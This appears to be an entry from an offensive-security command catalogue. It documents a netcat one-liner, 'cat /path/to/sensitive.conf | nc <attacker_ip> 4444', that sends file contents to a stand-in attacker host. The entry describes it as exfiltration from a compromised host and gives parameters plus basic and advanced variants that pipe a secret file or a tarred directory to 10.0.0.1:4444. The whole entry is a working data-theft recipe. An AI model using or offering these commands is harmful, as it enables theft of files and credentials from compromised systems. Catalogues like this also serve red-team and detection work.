---
id: cmd-nc-transfer-001
data: cat /path/to/sensitive.conf | nc <attacker_ip> 4444
tags:
  - exfil
  - transfer
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.329Z'
verified: false
validated: true
submitted: true
---
# nc-transfer

## Command

```bash
cat /path/to/sensitive.conf | nc <attacker_ip> 4444
```

## Description

Transfers file contents over a netcat connection for exfiltration from a compromised host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cat /path/to/file` | Reads and pipes file | Yes |
| `nc` | Netcat for transfer | Yes |
| `<attacker_ip>` | Receiver IP | Yes |
| `4444` | Listener port | Yes |

## Examples

### Basic Usage

```bash
cat secret.txt | nc 10.0.0.1 4444
```

### Advanced Usage

```bash
tar czf - /dir | nc 10.0.0.1 4444
```

## Expected Output

File contents streamed; no output on sender if successful.

## Related

- [[Related Procedure: Exfiltrate-Files-via-RCE]]
